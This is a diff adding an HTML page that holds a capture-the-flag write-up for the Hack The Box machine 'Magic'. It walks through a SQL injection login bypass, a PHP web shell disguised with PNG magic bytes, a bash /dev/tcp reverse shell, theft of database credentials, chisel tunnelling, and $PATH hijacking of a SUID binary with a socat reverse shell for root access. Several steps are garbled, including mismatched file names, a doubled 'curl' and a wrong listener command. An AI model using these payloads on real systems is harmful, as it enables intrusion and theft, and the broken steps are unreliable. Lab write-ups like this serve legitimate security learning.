@@ -1,0 +1,170 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Magick</h1>
+    <p class="text">Medium : UD ; 4.7</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p -sCV &lt;TARGET_IP&gt; --min-rate=2000 </u>
+PORT      STATE    SERVICE    VERSION
+22/tcp    open     ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
+|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
+|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
+80/tcp    open     http       Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Magic Portfolio
+|_http-server-header: Apache/2.4.29 (Ubuntu)</code></pre></div>
+
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/magick/1.png' %}" alt="">
+    <img src="{% static 'EthHack/images/magick/2.png' %}" alt="">
+</div>
+
+<p class="text">The server holds home and login page. </p>
+<p class="text">There might be other interesting directory, therefore, let's enumerate directory before browsing these pages.</p>
+
+<div class="code-box"><pre><code>└─$ <u>feroxbuster -u http://&lt;TARGET_IP&gt;</u>
+<u class="green">snip...</u>
+
+200      GET        2l     1276w    88145c http://10.129.107.225/assets/js/jquery.min.js
+
+200      GET      296l     2079w   173684c http://10.129.107.225/images/uploads/magic-1424x900.jpg
+
+200      GET      192l     1093w    88071c http://10.129.107.225/images/fulls/5.jpeg
+
+200      GET      255l     1421w   121103c http://10.129.107.225/images/uploads/magic-wand.jpg
+<u class="green">...snip</u>
+</code></pre></div>
+
+
+
+<h2 class="subtitle">Foothold</h2>
+<p class="text">We can infer that the webpage doesn't use any template engines. Therefore, it's common case that the security problem exits. Because the login form is really simple, we can try sql injeciton.</p>
+
+<div class="code-box"><pre><code>a' or 1=1;-- - <u class="green">#input this code on username. You may not able to enter space key, so copy and paste it.</u></code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/magick/3.png' %}" alt="">
+    <p class="text">As I thought, we could enter upload page. <br>We can upload file. This case can cause malicious file upload. When I tried to upload file with php extension, it returned we can only upload jpg, png, and jpeg file.</p>
+</div>
+
+
+<p class="text">In this case where we can upload arbitrary file and can access via url, but with file extension whitelist, we can use the technique <u>"File Magic Number"</u>. This technique falsify your machine by appending specific hex characters which determine file type.</p>
+
+
+<div class="code-box"><pre><code>nano rev.php 
+<u class="green">&lt;?php system($_REQUEST['cmd']);?></u>
+echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r >> hex_rev.php.png
+cat rev.php >> img_rev.php.png</code></pre></div>
+
+<p class="text">We can upload this hex_rev.php.png file to the page. To make it more intuitive, let's compare file command outputs.</p>
+
+<div class="code-box"><pre><code>└─$ file img_rev.php.png rev.php.png
+img_rev.php.png: data
+rev.php.png:     PHP script, ASCII text</code></pre></div>
+
+<p class="text">As you can see, the first one we falsified file type is recognized as data, but the second one is recognized as PHP script/ASCII text. </p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/magick/4.png' %}" alt="">
+    <p class="text">We successfully uploaded the file. This file is stored in <u>http://&lt;TARGET_IP&gt;/images/uploads/img_rev.php.png</u>. We can cause RCE with it.</p>
+</div>
+
+
+<div class="code-box"><pre><code>└─$curl curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/&lt;YOUR_IP&gt;/4444 0>&1"' http://10.129.107.225/images/uploads/img_rev.php.png?cmd
+<u class="green"># Don't forget to open your port with nc -lvnp 4444</u>
+www-data@magic:/var/www/Magic/images/uploads$ </code></pre></div>
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+
+<p class="text">On the /var/www/Magic directory, interesting file exists.</p>
+
+<div class="code-box"><pre><code>www-data@magic:/var/www/Magic$ cat db.php5
+cat db.php5
+&lt;?php
+class Database
+{
+    private static $dbName = 'Magic' ;
+    private static $dbHost = 'localhost' ;
+    private static $dbUsername = '<u>theseus</u>';
+    private static $dbUserPassword = '<u>iamkingtheseus</u>';</code></pre></div>
+
+<p class="text">However, if we try to open mysql, "Command 'mysql' not found" message returned. Therefore, we have to find a way to use database target machine holds. If we could connect socket 3306 with our port, we can make use of target's database, don't we?</p>
+<p class="text">In this case, we can use a tool called <u>"chisel"</u>, which a lightweight TCP/UDP tunneller (client+server single binary) that tunnels arbitrary traffic over HTTP(S) to bypass firewalls and enable port-forwarding / pivoting.</p>
+<p class="text">You can install chisel from <a href="https://github.com/jpillora/chisel/releases">here</a>. The newest version is chisel_1.11.3_linux_amd64.gz now.</p>
+<p class="text">After downloading, unzip it...</p>
+
+<div class="code-box"><pre><code>└─$ gzip -d chisel_1.11.3_linux_amd64.gz
+└─$ python3 -m http.server 8000</code></pre></div>
+
+<p class="text">Then, on the target machine, </p>
+<div class="code-box"><pre><code>www-data@magic:/var/www/Magic$ cd /tmp
+www-data@magic:/tmp$ wget http://&lt;YOUR_IP&gt;:8000/chisel_1.11.3_linux_amd64
+www-data@magic:/tmp$ chmod +x chisel_1.11.3_linux_amd64</code></pre></div>
+
+<p class="text">On your machine...</p>
+
+<div class="code-box"><pre><code>└─$ ./chisel_1.11.3_linux_amd64 server -p 8000 -reverse</code></pre></div>
+
+<p class="text">Finally, on the target machine...</p>
+<div class="code-box"><pre><code>./chisel_1.11.3_linux_amd64 client &lt;YOUR_IP&gt;:8000 R:3306:127.0.0.1:3306 &</code></pre></div>
+
+<p class="text">We can access to target's database with our mysql.</p>
+
+<div class="code-box"><pre><code>mysql -h 127.0.0.1 -P 3306 -u <u>theseus</u> <u>-piamkingtheseus</u></code></pre></div>
+
+
+<p class="text">You can get credential "admin:Th3s3usW4sK1ng".</p>
+
+<div class="code-box"><pre><code>www-data@magic:/tmp$ su theseus
+Password: Th3s3usW4sK1ng
+theseus@magic:/tmp$ </code></pre></div>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+
+<p class="text">The user theseus doesn't have any sudo privilege, therefore, we have to find other vector for privilege escalation.</p>
+
+<div class="code-box"><pre><code>find / -perm -4000 2>/dev/null
+<u class="green">SNIP....</u>
+-rwsr-x--- 1 root users 22040 Oct 21 2019 /bin/sysinfo
+<u class="green">....SNIP</u></code></pre></div>
+
+<p class="text">This file returns system information. This kind of executable isn't executable for low privileged users usually. It's interesting. Let's see scripts.</p>
+
+
+<div class="code-box"><pre><code>strings /bin/sysinfo\
+<u class="green">SNIP....</u>
+====================CPU Info====================
+cat /proc/cpuinfo
+<u class="green">....SNIP</u></code></pre></div>
+
+<p class="text">This output revealed that the command <u>cat</u> isn't full path. Therefore, we can exploit $PATH-hijacking vulnerability.</p>
+<p class="text">Also, the executable file is run by root user, therefore, if we could run a file which try to establish connection, we can get reverse shell of root. </p>
+<p class="text">For implementing that, we can use <u>socat</u> tool which is a versatile command-line utility that forwards and proxies data between two arbitrary data channels (sockets, files, TTYs, stdio, etc.). Think it as extra version of nc.</p>
+<p class="text">You can install it from <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat">here</a>. Just press view raw button.</p>
+<div class="code-box"><pre><code>└─$ python3 -m http.server 8000 <u class="green">#on your machine</u>
+theseus@magic:/tmp$ wget http://&lt;YOUR_IP&gt;/socat
+theseus@magic:/tmp$ chmod +x socat
+theseus@magic:/tmp$ export PATH=/tmp:$PATH
+theseus@magic:/tmp$ echo "./socat tcp-connect:&lt;YOUR_IP&gt;:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane" > cat
+theseus@magic:/tmp$ chmod +x cat
+└─$ python3 -m http.server 4444 <u class="green">#On your machine</u>
+theseus@magic:/tmp$ <u>sysinfo</u></code></pre></div>
+
+<p class="text">Then, you'll get root shell. Before cat /root/root.txt, you should remove /tmp/cat because it probably use /tmp/cat, not /usr/local/cat.</p>
+
+</body>
+</html>
